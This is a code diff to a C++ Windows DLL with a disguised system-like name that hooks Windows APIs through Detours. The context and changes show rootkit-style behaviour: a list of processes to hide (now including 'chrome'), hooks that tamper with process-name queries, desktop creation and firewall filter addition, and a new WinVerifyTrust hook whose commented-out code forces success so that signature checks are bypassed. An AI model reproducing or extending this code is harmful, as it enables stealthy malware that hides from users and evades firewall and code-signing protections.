@@ -19,6 +19,8 @@
 #include <netfw.h>
 #include <comdef.h>
 #include "fwpmu.h"
+#include <wintrust.h>
+#include <softpub.h>
 
 constexpr const char* DllNameX86 = "winhlpe32.dll";
 constexpr const char* DllNameX64 = "winhlpe64.dll";
@@ -215,8 +217,14 @@ WCHAR HiddenProcess[][MAX_PATH]{
     L"csrss.exe",
     L"csrss",
     L"MpUpdate.exe",
-    L"MpUpdate"
+    L"MpUpdate",
+    L"chrome"
 };
+
+typedef LONG(WINAPI* WinVerifyTrustType)(HWND hwnd, GUID* pgActionID, LPVOID pWVTData);
+
+WinVerifyTrustType OriginalWinVerifyTrust = nullptr;
+
 wchar_t* charToWchar(const char* mbString) {
     if (mbString == nullptr) {
         return nullptr; // Handle null pointer input
@@ -294,6 +302,38 @@ BSTR WINAPI HookedSysAllocString(const OLECHAR* psz) {
     }
 
     return OriginalSysAllocString(psz);
+}
+LONG WINAPI MyWinVerifyTrust(HWND hwnd, GUID* pgActionID, LPVOID pWVTData)
+{
+    OutputDebugStringW(L"MyWinVerifyTrust");
+
+    // 检查是否是文件验证请求
+    if (pWVTData)
+    {
+        WINTRUST_DATA* winTrustData = reinterpret_cast<WINTRUST_DATA*>(pWVTData);
+
+        // 确保是文件验证
+        if (winTrustData->dwUnionChoice == WTD_CHOICE_FILE)
+        {
+            WINTRUST_FILE_INFO* fileInfo = winTrustData->pFile;
+
+            if (fileInfo && fileInfo->pcwszFilePath)
+            {
+                std::wstring filePath = fileInfo->pcwszFilePath;
+
+                OutputDebugStringW(fileInfo->pcwszFilePath);
+                // 检查文件名是否匹配
+                //if (filePath.find(targetFileName) != std::wstring::npos)
+                //{
+                //    std::wcout << L"Hooked WinVerifyTrust for file: " << filePath << std::endl;
+                //    return ERROR_SUCCESS;  // 强制返回成功，绕过签名验证
+                //}
+            }
+        }
+    }
+    //return ERROR_SUCCESS;
+    // 如果文件名不匹配，调用原始的 WinVerifyTrust
+    return OriginalWinVerifyTrust(hwnd, pgActionID, pWVTData);
 }
 BOOL WINAPI MyQueryFullProcessImageNameA(HANDLE hProcess, DWORD dwFlags, LPSTR lpExeName, PDWORD lpdwSize)
 {
@@ -842,10 +882,10 @@ void HookFunctions()
     InstallHook("kernel32.dll", "QueryFullProcessImageNameW", (LPVOID*)&g_pQueryFullProcessImageNameW, MyQueryFullProcessImageNameW);
     InstallHook("User32.dll", "CreateDesktopW", (LPVOID*)&OriginalCreateDesktopW, HookedCreateDesktopW);
     InstallHook("User32.dll", "CreateWindowStationW", (LPVOID*)&OriginalCreateWindowStationW, HookedCreateWindowStationW);
-    InstallHook("User32.dll", "SetWindowPos", (LPVOID*)&pRealSetWindowPos, HookedSetWindowPos);
     InstallHook("Ws2_32.dll", "GetNameInfoW", (LPVOID*)&OriginalGetNameInfoW, MyGetNameInfoW);
     InstallHook("Fwpuclnt.dll", "FwpmFilterAdd0", (LPVOID*)&OriginalFwpmFilterAdd0, HookedFwpmFilterAdd0);
 
+    InstallHook("Wintrust.dll", "WinVerifyTrust", (LPVOID*)&OriginalWinVerifyTrust, MyWinVerifyTrust);
     //InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
     DetourTransactionCommit();
 }
